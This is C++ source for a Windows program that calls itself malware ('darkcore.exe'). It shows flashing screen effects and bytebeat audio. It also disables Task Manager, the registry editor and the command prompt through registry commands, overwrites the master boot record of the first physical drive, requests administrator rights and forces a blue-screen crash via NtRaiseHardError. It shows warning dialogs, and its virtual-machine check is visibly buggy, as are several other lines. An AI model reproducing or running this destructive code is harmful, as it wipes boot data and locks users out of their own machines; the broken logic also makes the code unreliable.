#include <windows.h>
#include <mmsystem.h>
#include <functional>
#include <iostream>
#include <cmath>
#include <TlHelp32.h>
#include <string>
#include <fstream>
#include <algorithm>
#include "boot.h"

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")

typedef NTSTATUS(WINAPI* RtlAdjustPrivilege_t)(ULONG Privilege, BOOL Enable, BOOL CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(WINAPI* NtRaiseHardError_t)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

// note im a noob so if i do something wrong just know it 

// --< Sounds >--
using SndCalc = std::function<char(DWORD)>;

void play(SndCalc calc) {
    HWAVEOUT Wave = 0;
    WAVEFORMATEX Format = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&Wave, WAVE_MAPPER, &Format, 0, 0, CALLBACK_NULL);
    char Sound[8000 * 30];

    for (DWORD t = 0; t < sizeof(Sound); ++t) {
		Sound[t] = calc(t);
    }

    WAVEHDR Head = { Sound, sizeof(Sound), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(Wave, &Head, sizeof(WAVEHDR));
    waveOutWrite(Wave, &Head, sizeof(WAVEHDR));
    waveOutUnprepareHeader(Wave, &Head, sizeof(WAVEHDR));
    waveOutClose(Wave);
}

VOID WINAPI sound1() {
	play([](DWORD t) -> char {
		return static_cast<char>(t % 4000 * (t >> 10));
	});
}

VOID WINAPI sound2() {
	play([](DWORD t) -> char {
        return static_cast<char>(t * (t >> 5 | t >> 8) & 127);
    });
}

VOID WINAPI sound3() {
	play([](DWORD t) -> char {
        return static_cast<char>(t * t >> 10 | t >> 5);
    });
}

VOID WINAPI sound4() {
    play([](DWORD t) -> char {
        return static_cast<char>(t >> (t & t * t >> 10 | t >> 7) | t & t >> 5);
    });
} 

VOID WINAPI sound5() {
    play([](DWORD t) -> char {
        return static_cast<char>(t*(t^t>>9));
    });
}

void WINAPI sound6() {
    play([](DWORD t) -> char {
        return static_cast<char>(((t * (t >> 9)) | ((t >> 4) | (t >> 2))));
    });
}

void WINAPI sound7() {
    play([](DWORD t) -> char {
        return static_cast<char>(t * (t & t >> 10));
    });
}

void WINAPI sound8() {
    play([](DWORD t) -> char {
        return static_cast<char>(t*(((t>>8)&(t>>10))^((t>>9)&(t>>11))));
    });
}

// --< Sounds >--

// --< Visual >--
DWORD WINAPI Dark_Shader(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

    int size = width * height;

    DWORD* Pixels = (DWORD*)VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    while (true) {
        PRGBTRIPLE Rgb;
        HDC Screen = GetDC(0);
        HDC Memory = CreateCompatibleDC(Screen);
        BITMAPINFO bmi = { 40, width, height, 1, 24 };
        HBITMAP Bitmap = CreateDIBSection(Screen, &bmi, 0, (void**)&Rgb, 0, 0); 
        
        SelectObject(Memory, Bitmap);
        BitBlt(Memory, 0, 0, width, height, Screen, 0, 0, SRCCOPY);

        for (int Pixel = 0; Pixel <= size; Pixel++) {
            Rgb[Pixel].rgbtRed = std::max(50, Rgb[Pixel].rgbtRed * 5);
            Rgb[Pixel].rgbtGreen = std::max(50, Rgb[Pixel].rgbtRed * 5);
            Rgb[Pixel].rgbtBlue = std::max(50, Rgb[Pixel].rgbtRed * 5);
        }

        BitBlt(Screen, 0, 0, width, height, Memory, 0, 0, SRCCOPY);
        Sleep(5);

        ReleaseDC(0, Screen);
        DeleteObject(Bitmap);
        DeleteObject(Rgb);
        DeleteDC(Memory);
        DeleteDC(Screen);
    }
    return 0;
}

DWORD WINAPI Color_Shader(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

    COLORREF dwTable[] = {0xd95148,0x5969cf,0x7a5acc,0xcc5a93,0x6fc798};
    // not random values its hex color
    while (true) {
        HDC Screen = GetDC(0);

        HBRUSH brush = CreateSolidBrush(dwTable[rand() % 6]);
        
        SelectObject(Screen, brush);
        BitBlt(Screen, 0, 0, width, height, Screen, 0, 0, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(0, Screen);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Shake(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

    while (true) {
        HDC Screen = GetDC(0);
        BitBlt(Screen, 0, 0, width, height, Screen, -20, 0, SRCCOPY);
        BitBlt(Screen, 0, 0, width, height, Screen, width - 20, 0, SRCCOPY);
        BitBlt(Screen, 0, 0, width, height, Screen, 0, -20, SRCCOPY);
        BitBlt(Screen, 0, 0, width, height, Screen, 0, height - 20, SRCCOPY);
        ReleaseDC(0, Screen);
        Sleep(10);
    }
}

DWORD WINAPI Red_Shader(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

    int size = width * height;

    DWORD* Pixels = (DWORD*)VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    while (true) {
        PRGBTRIPLE Rgb;
        HDC Screen = GetDC(0);
        HDC Memory = CreateCompatibleDC(Screen);
        BITMAPINFO bmi = { 40, width, height, 1, 24 };
        HBITMAP Bitmap = CreateDIBSection(Screen, &bmi, 0, (void**)&Rgb, 0, 0); 
        
        SelectObject(Memory, Bitmap);
        BitBlt(Memory, 0, 0, width, height, Screen, 0, 0, SRCCOPY);

        for (int Pixel = 0; Pixel <= size; Pixel++) {
            if (Pixel != size) {
                Rgb[Pixel].rgbtRed = Rgb[Pixel].rgbtRed % 150 + (rand() % 20);
                Rgb[Pixel].rgbtGreen =  Rgb[Pixel].rgbtGreen % 150;
                Rgb[Pixel].rgbtBlue =  Rgb[Pixel].rgbtBlue % 150;
            }
        }

        BitBlt(Screen, 0, 0, width, height, Memory, 0, 0, SRCCOPY);
        Sleep(10);

        ReleaseDC(0, Screen);
        DeleteObject(Bitmap);
        DeleteObject(Rgb);
        DeleteDC(Memory);
        DeleteDC(Screen);
    }
    return 0;
}

DWORD WINAPI Line_Glitch(LPVOID lpParam) {
	while (true) {
    	HDC Screen = GetDC(NULL);
    	int Width = GetSystemMetrics(0);
        int Height = GetSystemMetrics(1);
   		BitBlt(Screen, rand() % Width, 10, 100, Height, Screen, rand() % Width, 0, SRCCOPY);
    	ReleaseDC(NULL, Screen);
	}
}

DWORD WINAPI Static_Shader(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

    int size = width * height;

    DWORD* Pixels = (DWORD*)VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    while (true) {
        PRGBTRIPLE Rgb;
        HDC Screen = GetDC(0);
        HDC Memory = CreateCompatibleDC(Screen);
        BITMAPINFO bmi = { 40, width, height, 1, 24 };
        HBITMAP Bitmap = CreateDIBSection(Screen, &bmi, 0, (void**)&Rgb, 0, 0); 
        
        SelectObject(Memory, Bitmap);
        BitBlt(Memory, 0, 0, width, height, Screen, 0, 0, SRCCOPY);

        for (int Pixel = 0; Pixel <= size; Pixel++) {
            int R = Rgb[Pixel].rgbtRed;
            int G = Rgb[Pixel].rgbtGreen;
            int B = Rgb[Pixel].rgbtBlue;
            Rgb[Pixel].rgbtRed = R * 2 / 4 + Pixel;
            Rgb[Pixel].rgbtGreen =  B ^ 2 / 2 + Pixel;
            Rgb[Pixel].rgbtBlue =  G + R / 3 + Pixel;
        }
        
        BitBlt(Screen, 0, 0, width, height, Memory, 0, 0, SRCCOPY);
        Sleep(10);

        ReleaseDC(0, Screen);
        DeleteObject(Bitmap);
        DeleteObject(Rgb);
        DeleteDC(Memory);
        DeleteDC(Screen);
    }
    return 0;
}

DWORD WINAPI Idk_Shader(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

    int size = width * height;

    DWORD* Pixels = (DWORD*)VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    while (true) {
        PRGBTRIPLE Rgb;
        HDC Screen = GetDC(0);
        HDC Memory = CreateCompatibleDC(Screen);
        BITMAPINFO bmi = { 40, width, height, 1, 24 };
        HBITMAP Bitmap = CreateDIBSection(Screen, &bmi, 0, (void**)&Rgb, 0, 0); 
        
        SelectObject(Memory, Bitmap);
        BitBlt(Memory, 0, 0, width, height, Screen, 0, 0, SRCCOPY);

        for (int i = 0; i <= size; i++) {
            // changed to i for my crazy lazyness to type Pixel
            Rgb[i].rgbtRed += 360;
            Rgb[i].rgbtGreen += 360;
            Rgb[i].rgbtBlue += 360;
        }

        BitBlt(Screen, 0, 0, width, height, Memory, 0, 0, SRCCOPY);
        Sleep(10);

        ReleaseDC(0, Screen);
        DeleteObject(Bitmap);
        DeleteObject(Rgb);
        DeleteDC(Memory);
        DeleteDC(Screen);
    }
    return 0;
}

DWORD WINAPI Furnace(LPVOID lpParam) {
    while (true) {
    	HDC Screen = GetDC(NULL);
    	int width = GetSystemMetrics(0);
        int height = GetSystemMetrics(1);
        int part = rand() % width;
        Sleep(100);
   		BitBlt(Screen, part, 10, 100, width, Screen, part, 0, SRCCOPY);
    	ReleaseDC(NULL, Screen);
	}
}

DWORD WINAPI Idk_Shader2(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

    int size = width * height;

    DWORD* Pixels = (DWORD*)VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    while (true) {
        PRGBTRIPLE Rgb;
        HDC Screen = GetDC(0);
        HDC Memory = CreateCompatibleDC(Screen);
        BITMAPINFO bmi = { 40, width, height, 1, 24 };
        HBITMAP Bitmap = CreateDIBSection(Screen, &bmi, 0, (void**)&Rgb, 0, 0); 
        
        SelectObject(Memory, Bitmap);
        BitBlt(Memory, 0, 0, width, height, Screen, 0, 0, SRCCOPY);

        for (int i = 0; i <= size; i++) {
            Rgb[i].rgbtRed += i + 20;
            Rgb[i].rgbtGreen += i + 10;
            Rgb[i].rgbtBlue += i * 3;
        }

        BitBlt(Screen, 0, 0, width, height, Memory, 0, 0, SRCCOPY);
        Sleep(10);

        ReleaseDC(0, Screen);
        DeleteObject(Bitmap);
        DeleteObject(Rgb);
        DeleteDC(Memory);
        DeleteDC(Screen);
    }
    return 0;
}

DWORD WINAPI ScrollDown(LPVOID lpParam) {
	while (true) {
    	HDC Screen = GetDC(NULL);
    	int Width = GetSystemMetrics(0);
        int Height = GetSystemMetrics(1);
   		BitBlt(Screen, -10, 10, Width, Height, Screen, -10, 0, SRCCOPY);
    	ReleaseDC(NULL, Screen);
        Sleep(100);
	}
}

DWORD WINAPI Idk(LPVOID lpParam) {
    while (true) {
        HDC Screen = GetDC(NULL);
        int Width = GetSystemMetrics(0);
        int Height = GetSystemMetrics(1);
        BitBlt(Screen, rand() % 100, rand() % 100, Width, Height, Screen, rand() % 100, rand() % 100, SRCCOPY);
        ReleaseDC(NULL, Screen);
        Sleep(100);
    }
}
// --< Visual >--

// --< Destruction >--
int Remove_Usefull() {
    // -< Task Manager >-
	system("reg add hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t reg_dword /d 1 /f");

    // -< Registry Editor >-
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f");
        
    // -< CMD >-
    system("reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\System\" /v DisableCMD /t REG_DWORD /d 2 /f");
	return 1;
}

int WipeMBR() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    DWORD dwBytesWritten = 0;
    BOOL result = WriteFile(hDevice, boot, static_cast<DWORD>(sizeof(boot)), &dwBytesWritten, NULL);
    CloseHandle(hDevice);
    return 1;
}
// --< Destruction >--

// --< Admin Issues >--
bool IsAdmin() {
    BOOL admin;
    PSID adminSid;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&ntAuth, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminSid);
    CheckTokenMembership(NULL, adminSid, &admin);
    FreeSid(adminSid);
    return admin == TRUE;
}
// --< Admin Issues >--

// --< Real Machine Checker >--
bool IsVM() {
    system("wmic computersystem get manufacturer > darkcore_wants_you.txt");
    /*
        i used batch bcz normal way in cpp is Hard and takes a lot of lines
    */
    
    std::ifstream fout("darkcore_wants_you.txt");
    std::string line;
    std::string manufacturer;

    if (fout.is_open())
    {
        getline(fout, line);
        if (getline(fout, line))
        {
            line.erase(std::remove(line.begin(), line.end(), '\n'), line.end());
            line.erase(std::remove(line.begin(), line.end(), '\r'), line.end());

            manufacturer = line;
        }
        fout.close();
    }
    system("del darkcore_wants_you.txt");

    std::transform(manufacturer.begin(), manufacturer.end(), manufacturer.begin(), ::tolower);

    if (manufacturer.find("vmware") != std::string::npos ||
       manufacturer.find("innotek gmbh") || // virtual box <<< 
       manufacturer == "") // mostly windows sandbox has it empty bcz wmic doesnt exist on it
        return true;

    return false;
}
// --< Real Machine Checker >--

// --< Main >--
int main() {
    if (!IsVM()) {
        MessageBoxW(NULL, L"It refused to run...", L"darkcore.exe By chinawillspyonusa", MB_YESNO | MB_ICONEXCLAMATION);
        ExitProcess(0);
    }

    if (!IsAdmin()) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        ShellExecuteA(NULL, "runas", path, NULL, NULL, SW_SHOWNORMAL);
        return 0;
    }

    // -< Warnings >-
    if (MessageBoxW(NULL, L"Run Malware? This will wipe your windows", L"darkcore.exe By chinawillspyonusa", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }

    if (MessageBoxW(NULL, L"This Program has epilepsy,\nClick Yes if you wanna run or No to close.", L"darkcore.exe By chinawillspyonusa", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
        
    // -< Warnings >-

    Remove_Usefull();
    WipeMBR();

    Sleep(2500);

    HANDLE dark = CreateThread(0, 0, Dark_Shader, 0, 0, 0);
    HANDLE burn = CreateThread(0, 0, Furnace, 0, 0, 0);
    HANDLE down = CreateThread(0, 0, ScrollDown, 0, 0, 0);
    sound1();
    Sleep(30000);

    TerminateThread(dark, 0);
    TerminateThread(down, 0);
    HANDLE color = CreateThread(0, 0, Color_Shader, 0, 0, 0);
    HANDLE iddk = CreateThread(0, 0, Idk, 0, 0, 0);
    sound2();
    Sleep(30000);

    HANDLE shake = CreateThread(0, 0, Shake, 0, 0, 0);
    sound3();
    Sleep(30000);

    TerminateThread(shake, 0);
    TerminateThread(color, 0);
    HANDLE red = CreateThread(0, 0, Red_Shader, 0, 0, 0);
    sound4();
    Sleep(30000);

    TerminateThread(burn, 0);
    HANDLE line = CreateThread(0, 0, Line_Glitch, 0, 0, 0);
    sound5();
    Sleep(30000);

    TerminateThread(red, 0);
    TerminateThread(line, 0);
    HANDLE static_shd = CreateThread(0, 0, Static_Shader, 0, 0, 0);
    sound6();
    Sleep(30000);
    
    TerminateThread(static_shd, 0);
    HANDLE idk = CreateThread(0, 0, Idk_Shader, 0, 0, 0);
    sound7();
    Sleep(30000);

    TerminateThread(idk, 0);
    HANDLE idk2 = CreateThread(0, 0, Idk_Shader2, 0, 0, 0);
    sound8();
    Sleep(30000);
    TerminateThread(idk2, 0);

    BOOLEAN Bool;
    DWORD Res;
    NRHEdef NtRaiseHardError_t = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege_t = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege_t(19, 1, 0, &Bool);
    NtRaiseHardError_t(0xC0000145, 0, 0, 0, 6, &Res);
    return 1;
}
// --< Main >--
